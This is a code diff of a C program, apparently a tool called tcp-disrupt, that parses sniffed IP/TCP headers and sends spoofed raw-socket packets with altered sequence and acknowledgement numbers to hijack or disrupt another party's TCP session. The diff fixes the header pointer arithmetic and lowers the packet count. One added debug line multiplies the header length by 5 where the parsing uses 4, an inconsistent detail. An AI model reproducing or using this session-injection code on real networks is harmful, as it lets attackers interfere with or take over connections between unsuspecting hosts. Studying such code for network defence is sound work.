@@ -77,10 +77,10 @@ void display_usage(char *name) {
  *
  * Once the function has been hijacked, and the desired actions have been taken on the hijacked session, this function should exit tcp-disrupt. 
  */
-void disrupt_session(void *sniffedPacket) {
-    
+void disrupt_session(void *sniffedPacket) {    
     struct ip *ipHeader         = (struct ip *)sniffedPacket;
-    struct tcphdr *tcpHeader    = (struct tcphdr *)(ipHeader + (4 * ipHeader->ip_hl));
+    void *headerPtr             = sniffedPacket + (ipHeader->ip_hl * 4);
+    struct tcphdr *tcpHeader    = (struct tcphdr *)headerPtr;
     struct sockaddr_in addr_in;
     addr_in.sin_family          = AF_INET;
     addr_in.sin_port            = ntohs(tcpHeader->source);
@@ -92,6 +92,9 @@ void disrupt_session(void *sniffedPacket) {
     int sock                    = -1;       // Socket FD
     int one                     = 1;        // ??????????????
 
+
+
+    printf("Found ip header with length: %u", (ipHeader->ip_hl) * 5);
     //Raw socket without any protocol-header inside
     if((sock = socket(PF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
         perror("Error while creating socket\n");
@@ -103,21 +106,21 @@ void disrupt_session(void *sniffedPacket) {
         exit(-1);
     }
 
-    int packetCountdown = 50;
+    int packetCountdown = 5;
     while(packetCountdown--){
         printf("Sending {");
         printf("\"srcIP\":\"%s\", ",    inet_ntoa(ipHeader->ip_src));
         printf("\"dstIP\":\"%s\", ",    inet_ntoa(ipHeader->ip_dst));
-        printf("\"dstPort\":%d, ",      ntohs(tcpHeader->dest));
-        printf("\"srcPort\":%d, ",      ntohs(tcpHeader->source));
+        printf("\"dstPort\":%u, ",      ntohs(tcpHeader->dest));
+        printf("\"srcPort\":%u, ",      ntohs(tcpHeader->source));
         printf("\"SYN\":%d, ",          SYN_OFF);
         printf("\"ACK\":%d, ",          ACK_ON);
+        printf("\"RST\":%d, ",          RESET_OFF);
         printf("\"ACK_NUM\":%u, ",      ntohl(tcpHeader->ack_seq) + ack_inc);
         printf("\"SYN_NUM\":%u, ",      ntohl(tcpHeader->seq) + seq_inc);
-        printf("\"RST\":%d, ",          RESET_OFF);
         printf("\"data\":\"%s\"",       "X");
         printf("}");
-        
+
         fill_packet(inet_ntoa(ipHeader->ip_dst),            // Source IP Address
                     inet_ntoa(ipHeader->ip_src),            // Destination IP Address
                     ntohs(tcpHeader->source),               // Destination Port
